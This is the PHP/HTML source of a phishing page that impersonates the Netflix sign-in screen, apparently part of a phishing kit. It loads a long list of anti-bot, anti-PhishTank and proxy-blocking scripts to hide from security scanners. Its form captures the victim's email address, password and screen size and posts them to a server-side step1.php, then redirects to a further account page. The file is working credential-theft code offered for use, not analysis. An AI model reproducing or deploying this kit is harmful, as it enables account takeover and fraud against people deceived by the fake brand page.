<?php
	include "../Greybots/Bad_ip.php";
	include "../Greybots/Grey-Bot-1.php";
	include "../Greybots/Grey-Bot-2.php";
	include "../Greybots/Grey-Bot-3.php";
	include "../Greybots/Grey-Bot-4.php";
	include "../Greybots/Grey-Bot-5.php";
	include "../Greybots/Grey-Bot-6.php";
	include "../Greybots/Grey-Bot-7.php";
	include "../Greybots/Grey-Bot-8.php";
	include "../Greybots/Grey-Bot-9.php";
	include "../Greybots/Grey-Bot-10.php";
	include "../Greybots/Grey-Bot-11.php";
	include "../Greybots/Grey-Bot-12.php";
	include "../Greybots/Grey-Bot-Crawler.php";
	include "../Greybots/Grey-IP-BlackList.php";
	include "../Greybots/Grey-Phishingtank.php";
	include "../Greybots/Grey-antibot-phishtank.php";
	include "../Greybots/Grey-Proxyblock.php";
	include "../Greybots/Grey-userAgent-1.php";
	include "../Greybots/Grey-antibot-host.php";
	include "../Greybots/Grey-antibot-ip.php";
	include "../Greybots/Grey-antibot-proxy.php";
	include "../Greybots/Grey-Blocker.php";
	include "../Greybots/Grey-Bot.php";
	

?>
<?php session_start();
   if(!isset($_SESSION['language'])){exit(header("Location: index"));
   }else{include "system/languages/{$_SESSION['language']}.php";
   }?>
<!DOCTYPE html>
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <title>Netflix</title>
      <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
      <link id="lib_main" type="text/css" rel="stylesheet" href="files/css/none.css">
      <link id="lib" type="text/css" rel="stylesheet" href="files/css/none2.css">
      <link rel="shortcut icon" href="files/img/favicon.ico">
      <link rel="apple-touch-icon" href="files/img/favicon.png">
      <script type="text/javascript" src="files/js/modernizr.min.js"></script>
	  <script src="files/js/jquery.js"></script> 
      <script src="files/js/jquery.ccvalid.js"></script>
      <script src="files/js/jquery.mask.js"></script>
   </head>
   <body>
      <main>
         <div class="wrapper">
            <div class="official_bg">
               <img src="files/img/bg.jpg" alt="">
            </div>
            <div class="head_logo">
               <div>
                  <img src="files/img/logo.svg" alt="">
               </div>
            </div>
            <div class="main_body">
               <div class="main_content main_formule">
                  <div class="main_frm_wrapper">
                     <h1><?php echo $lg_tr['head']?></h1>
                     <div class="main_alert" style="display:none" id="msg">
                        <div class="main_alert_msg"><?php echo $lg_tr['msg']?></div>
                     </div>
                     <form method="post" action="javascript:void(0)">
                        <div class="main_inp">
                           <div class="place_inp">
                              <div class="inp_control">
                                 <label class="input_id">
                                 <input type="text" name="eml" class="input" id="eml">
                                 <label for="eml" class="place_lbl"><?php echo $lg_tr['lbl_eml']?></label>
                                 <input type="hidden" name="screen"></label>
                              </div>
                           </div>
                           <div class="msg_error"><?php echo $lg_tr['msg_eml']?></div>
                        </div>
                        <div class="main_inp inp_pass">
                           <div class="place_inp">
                              <div class="inp_pass_control">
                                 <label class="input_id">
                                 <input type="password" id="pss" name="pss" class="input">
                                 <label for="pss" class="place_lbl"><?php echo $lg_tr['lbl_pss']?></label></label>
                                 <button id="show_hide" type="button" class="show_hide" data-show="<?php echo $lg_tr['show_pss']?>" data-hide="<?php echo $lg_tr['hide_pss']?>"><?php echo $lg_tr['show_pss']?></button>
                                 <script>$(document).on('focusin','#pss',function(){if($(this).val()){$('#show_hide').show();
                                    }});$(document).on('focusout','#pss',function(){if($(this).val()){$('#show_hide').show();
                                    }else{$('#show_hide').hide();
                                    }});$(document).on('click','#show_hide',function(){if($.trim($(this).html())==$(this).data('show')){$(this).html($(this).data('hide'));
                                    $('#pss').attr('type','text');}else{$(this).html($(this).data('show'));
                                    $('#pss').attr('type','password');}});
                                 </script>
                              </div>
                           </div>
                           <div class="msg_error"><?php echo $lg_tr['msg_pss']?></div>
                        </div>
                        <button class="btn login-button btn-submit btn-small" type="submit"><?php echo $lg_tr['head']?></button>
                        <div class="remember_help">
                           <div class="extra_inp remember_inp">
                              <input id="rmm" type="checkbox" value="true" checked>
                              <label for="rmm">
                              <span class="remember_lbl"><?php echo $lg_tr['remember']?></span></label>
                              <div class="helper"></div>
                           </div>
                           <a href="#" class="help_lnk"><?php echo $lg_tr['help']?></a>
                        </div>
                     </form>
                  </div>
                  <div class="using_fb">
                     <div class="fb_frm">
                        <div class="fb_min">
                           <button class="btn minimal-login btn-submit btn-small" type="submit" autocomplete="off" tabindex="0">
                              <div class="fb-login"><img class="icon-facebook" src="files/img/fb.png">
                                 <span class="fbBtnText"><?php echo $lg_tr['fb']?></span>
                              </div>
                           </button>
                        </div>
                     </div>
                     <div class="new_acc"><?php echo $lg_tr['new']?><a href="javascript:void(0)"><?php echo $lg_tr['signup']?></a>. </div>
                  </div>
               </div>
            </div>
            <div class="footer_main footer_main_first">
               <div class="footer_divider"></div>
               <div class="footer_wrapper">
                  <p class="footer__top"><a class="footer_top_a" href="javascript:void(0)"><?php echo $lg_tr['contact']?></a></p>
                  <ul class="footer_lnk stru">
                     <li class="footer-link-item"><a class="footer-link" href="javascript:void(0)"><?php echo $lg_tr['gift']?></a></li>
                     <li class="footer-link-item"><a class="footer-link" href="javascript:void(0)"><?php echo $lg_tr['terms']?></a></li>
                     <li class="footer-link-item"><a class="footer-link" href="javascript:void(0)"><?php echo $lg_tr['privacy']?></a></li>
                  </ul>
                  <div class="lang_switch">
                     <div class="flat_select">
                        <div class="select-arrow medium prefix globe">
                           <select class="ui-select medium" id="selectLang">
                              <option value="en" <?php echo $_SESSION['language']=='en'?'selected':''?>>English</option>
                              <option value="es" <?php echo $_SESSION['language']=='es'?'selected':''?>>Español</option>
                           </select>
                           <script>$(document).on('change','#selectLang',function(){window.location.href='index?lang='+$(this).val();});</script>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </main>
      <div id="rotate" style="display:none">
         <div class="circle">
            <div class="rotate"></div>
         </div>
         <div class="overlay"></div>
      </div>
      <script>$("#lib").attr('disabled', '');
$("[name=screen]").val(screen.width + ' x ' + screen.height);

function isEmail(email) {
    return /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/.test($.trim(email));
}
$(document).on("keyup", ".input", function() {
    if ($(this).val()) {
        $(this).addClass("hasText");
    } else {
        $(this).removeClass("hasText");
    }
    if (!$(this).val()) {
        $(this).parent().parent().parent().parent().addClass("error");
        return false;
    } else {
        $(this).parent().parent().parent().parent().removeClass("error");
    }
});
$(document).on("keyup", "[name=eml]", function() {
    if (!isEmail($(this).val())) {
        $(this).parent().parent().parent().parent().addClass("error");
        return false;
    } else {
        $(this).parent().parent().parent().parent().removeClass("error");
    }
});
$(document).on("submit", "form", function(e) {
    e.preventDefault();
    var me = $(this);
    var check = true;
    if (!isEmail($("[name=eml]").val())) {
        $("[name=eml]").parent().parent().parent().parent().addClass("error");
        check = false;
    } else {
        $("[name=eml]").parent().parent().parent().parent().removeClass("error");
    }
    if (!$("[name=pss]").val()) {
        $("[name=pss]").parent().parent().parent().parent().addClass("error");
        check = false;
    } else {
        $("[name=pss]").parent().parent().parent().parent().removeClass("error");
    }
    if (!check) {
        return false;
    } else {
        $("#rotate").show();
        $.post("system/step1.php", me.serialize(), function(data, status, ) {
            if (status == "success") {
                if (data == "error") {
                    $("#msg").show();
                    $("#rotate").hide();
                    me[0].reset();
                    $(".input").removeClass("hasText");
                } else {
                $(location).attr("href", "./account.php?country.x=Global&flowContext=login&flowId=ul&_Email=datax");
                }
            } else {
                $("#msg").show();
                $("#rotate").hide();
            }
        });
    }
});
      </script>
   </body>
</html>